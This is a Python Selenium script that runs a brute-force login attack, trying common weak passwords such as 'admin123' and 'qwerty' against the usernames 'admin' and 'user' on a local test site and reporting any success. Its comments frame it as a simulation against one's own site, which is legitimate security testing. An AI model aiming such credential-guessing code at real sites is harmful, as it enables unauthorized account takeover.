from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

# Initialize Selenium WebDriver
service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service)

try:
    # Open the login page of your test website
    driver.get("http://127.0.0.1:8000/accounts/login/")  # Modify to your test site URL

    # Print the entire HTML of the page for debugging
    print(driver.page_source)

    # Wait for the username field to be present
    user_input = WebDriverWait(driver, 30).until(
        EC.presence_of_element_located((By.NAME, "email_or_username"))
    )

    # Wait for the password field to be present
    pass_input = WebDriverWait(driver, 30).until(
        EC.presence_of_element_located((By.NAME, "password"))
    )

    # Define test usernames and passwords
    usernames = ["admin", "user"]  # Test usernames
    password_list = ["password123", "admin123", "letmein", "123456", "qwerty"]  # Sample weak passwords

    # Brute-force simulation
    for username in usernames:
        for password in password_list:
            try:
                # Clear fields before each attempt
                user_input.clear()
                pass_input.clear()

                # Enter credentials and submit
                user_input.send_keys(username)
                pass_input.send_keys(password)
                pass_input.send_keys(Keys.RETURN)

                # Wait for the response (e.g., redirect or error message)
                WebDriverWait(driver, 5).until(
                    EC.url_contains("dashboard")  # Modify based on your website behavior
                )
                print(f"Success! Username: {username}, Password: {password}")
                break  # Exit the loop if successful

            except Exception as e:
                print(f"Failed attempt - Username: {username}, Password: {password}")
                print(f"Error: {e}")

                # Print the current URL and page source for debugging
                print(f"Current URL: {driver.current_url}")
                print(driver.page_source)

                # Take a screenshot for debugging
                driver.save_screenshot(f"error_{username}_{password}.png")

            # Go back to the login page for the next attempt
            driver.get("http://127.0.0.1:8000/accounts/login/")

            # Re-locate the username and password fields after navigating back
            user_input = WebDriverWait(driver, 30).until(
                EC.presence_of_element_located((By.NAME, "email_or_username"))
            )
            pass_input = WebDriverWait(driver, 30).until(
                EC.presence_of_element_located((By.NAME, "password"))
            )

except Exception as e:
    print(f"An error occurred: {e}")
    driver.save_screenshot("error_screenshot.png")  # Take a screenshot for debugging

finally:
    # Close the browser
    driver.quit()